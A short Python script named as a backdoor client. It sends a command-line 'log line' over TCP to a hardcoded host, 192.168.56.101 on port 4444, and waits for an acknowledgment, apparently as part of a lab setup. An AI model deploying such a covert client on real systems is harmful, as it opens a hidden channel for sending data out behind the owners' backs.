#!/usr/bin/python3

import sys
import socket

def main():
    if len(sys.argv) < 2:
        print("Usage: python3 client_backdoor.py <log_line>")
        sys.exit(1)

    log_line = sys.argv[1]
    #print(log_line)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # NOTE: make sure to Change host (server_addr)
    server_addr = '192.168.56.101'  # Server address
    port = 4444
    s.connect((server_addr, port))
    
    # Send log line to server
    s.send(log_line.encode('utf-8'))

    msg = s.recv(1024)  # Receive acknowledgment from server
    s.close()

    #print("Received acknowledgment:", msg.decode('utf-8'))

if __name__ == "__main__":
    main()
